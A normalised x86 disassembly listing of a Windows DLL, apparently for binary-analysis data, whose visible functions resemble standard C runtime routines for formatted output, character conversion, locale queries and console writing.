jne r-xdata
push eax
call sub_1003a068
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1002d4ee
mov [ eax ] edi
call sub_1002d4db
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_10027801
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_1002d4db
mov [ eax ] 0x9
call sub_1002d4ee
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100389d2
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10038b66
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_10038b70
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_1002d4db
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_1002d4db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_10027801
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_10038bea
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1002d4db
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10027801
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_1002d4db
mov [ eax ] 0x2a
call sub_1002d4db
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_1002d4db
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10027801
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_10027650
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_10027650
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10038d73
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_10030e59
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_1002d4db
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_10030e59
sub_10038dc0
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x260 ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x238 ] eax
call sub_1002a8c8
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1002d4db
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
xor eax eax
cmp ebx eax
je r-xdata
push esi
call sub_10031f47
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x254 ] eax
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
cmp [ ebp - 0x244 ] 0x0
je r-xdata
inc ebx
xor eax eax
cmp [ ebp - 0x228 ] eax
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
xor esi esi
cmp [ ebp - 0x240 ] esi
je r-xdata
mov cl dl
sub cl 0x20
cmp cl 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x240 ] 0x7
je r-xdata
mov ecx [ ebp - 0x240 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x240 ] eax
cmp eax esi
je r-xdata
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
call sub_1002d4db
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
push esi
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
call sub_10027801
add esp 0x14
cmp [ ebp - 0x244 ] 0x0
je r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_10039970 ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x26c ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x238 ] 0x0
lea eax [ ebp - 0x250 ]
push eax
movzx eax dl
push eax
call sub_10037a45
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x234 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x234 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x234 ] edi
test edi edi
jge r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x218 ] edi
test edi edi
jge r-xdata
mov al [ ebx ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x260 ]
lea esi [ ebp - 0x228 ]
call sub_10030e59
jmp r-xdata
mov ecx [ ebp - 0x260 ]
lea esi [ ebp - 0x228 ]
call sub_10030e59
mov al [ ebx ]
inc ebx
mov [ ebp - 0x23c ] ebx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x234 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ ebx + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x32
jne r-xdata
inc ebx
inc ebx
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x23c ] ebx
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
inc ebx
inc ebx
and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x23c ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc ebx
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x23c ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x21c ] edi
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x220 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] 0x10
je r-xdata
cmp [ ebp - 0x258 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x25c ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x25c ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x25c ]
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x230 ] 0x2
jmp r-xdata
cmp [ ebp - 0x254 ] 0x0
je r-xdata
mov eax [ ebp - 0x210 ]
test al 0x40
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
lea ebx [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x21c ] ebx
mov [ ebp - 0x264 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x224 ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x224 ] edi
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x26c ] 0x1
mov [ ebp - 0x211 ] dl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x21c ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp - 0x21c ]
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
push [ ebp - 0x254 ]
call sub_10027a85
and [ ebp - 0x254 ] 0x0
pop ecx
mov ebx [ ebp - 0x234 ]
sub ebx [ ebp - 0x220 ]
sub ebx [ ebp - 0x230 ]
test [ ebp - 0x210 ] 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
push [ ebp - 0x230 ]
mov edi [ ebp - 0x260 ]
lea eax [ ebp - 0x228 ]
lea ecx [ ebp - 0x22c ]
call sub_10038d73
test [ ebp - 0x210 ] 0x8
pop ecx
je r-xdata
push [ ebp - 0x260 ]
lea eax [ ebp - 0x228 ]
push ebx
push 0x20
call sub_10030e8c
add esp 0xc
test al 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov [ ebp - 0x278 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x274 ] eax
lea eax [ ebp - 0x250 ]
push eax
push [ ebp - 0x26c ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x224 ] edi
push eax
push [ ebp - 0x264 ]
lea eax [ ebp - 0x278 ]
push ebx
push eax
push [ rw-data ]
call sub_1002eeed
pop ecx
call eax
mov edi [ ebp - 0x210 ]
add esp 0x1c
and edi 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x224 ] edi
call sub_10038bd4
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x220 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x21c ] ecx
je r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x224 ] edi
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x238 ] 0x0
mov eax [ ebp - 0x220 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
test al 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x230 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] esi
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x238 ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x220 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call sub_10038d56
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x240 ] 0x0
inc eax
inc eax
inc eax
mov ecx [ ebp - 0x21c ]
push eax
lea eax [ ebp - 0x228 ]
call sub_10038d73
pop ecx
test eax eax
jle r-xdata
push edi
push ebx
push 0x30
lea eax [ ebp - 0x228 ]
call sub_10030e8c
add esp 0xc
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_1002ddb0
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x254 ] eax
push 0x8
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x250 ]
push eax
push ebx
push [ rw-data ]
call sub_1002eeed
pop ecx
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x228 ]
mov [ esi ] eax
mov ax [ ebp - 0x228 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x230 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x21c ] eax
jmp r-xdata
mov [ ebp - 0x258 ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x21c ]
mov [ ebp - 0x264 ] eax
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x21c ] eax
mov [ ebp - 0x264 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc ebx
mov [ ebp - 0x21c ] ebx
lea eax [ ebp - 0x250 ]
push eax
push ebx
push [ rw-data ]
call sub_1002eeed
pop ecx
call eax
pop ecx
pop ecx
mov [ ebp - 0x258 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x220 ]
cdq
push edx
push eax
push ebx
push edi
call sub_100379b0
add ecx 0x30
cmp ecx 0x39
mov [ ebp - 0x264 ] ebx
mov edi eax
mov ebx edx
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
push edi
push ebx
push 0x20
lea eax [ ebp - 0x228 ]
call sub_10030e8c
add esp 0xc
or [ ebp - 0x228 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x270 ] eax
je r-xdata
pop esi
call sub_10027160
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x25c ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x21c ] esi
je r-xdata
cmp [ ebp - 0x228 ] 0x0
jl r-xdata
push [ ebp - 0x270 ]
lea eax [ ebp - 0x228 ]
lea ecx [ ebp - 0xc ]
call sub_10038d73
cmp [ ebp - 0x264 ] 0x0
pop ecx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
movzx eax [ esi ]
dec [ ebp - 0x264 ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x270 ]
inc esi
push eax
inc esi
call sub_10038d56
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x21c ]
mov ecx [ ebp - 0x21c ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_10039990
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_1002eee4
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rw-data ]
call sub_1002eeed
pop ecx
test eax eax
je r-xdata
push eax
call sub_1002eeed
pop ecx
test eax eax
je r-xdata
push eax
call sub_1002eeed
push [ rw-data ]
mov esi eax
call sub_1002eeed
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_1002ee72
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_1002ee72
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_1002ee72
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_1002ee72
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_1002ee72
pop ecx
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_1002eeed
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_10039af9
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_1002d4db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rw-data ]
jmp r-xdata
sub_10039b44
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetLocaleInfoW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10039b78
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
mov ebx [ GetLocaleInfoW@IAT ]
push esi
push edi
xor edi edi
xor esi esi
inc edi
cmp eax esi
jne r-xdata
cmp eax 0x2
je r-xdata
push esi
push esi
push edi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetLocaleInfoA@IAT ]
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
cmp eax edi
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
cmp [ ebp + 0x1c ] esi
jne r-xdata
xor eax eax
jmp r-xdata
push esi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call ebx
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10027150
leave
retn
jle r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call ebx
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push edi
call sub_1002d97d
pop ecx
mov eax esi
jmp r-xdata
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_1002a4a4
pop ecx
cmp eax esi
je r-xdata
call sub_100375d0
mov edi esp
cmp edi esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push 0xffffffff
push edi
push esi
push [ ebp + 0x1c ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp edi esi
je r-xdata
sub_10039cb7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10039b78
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10039cf4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_1003ce98
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10027150
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_10039db9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
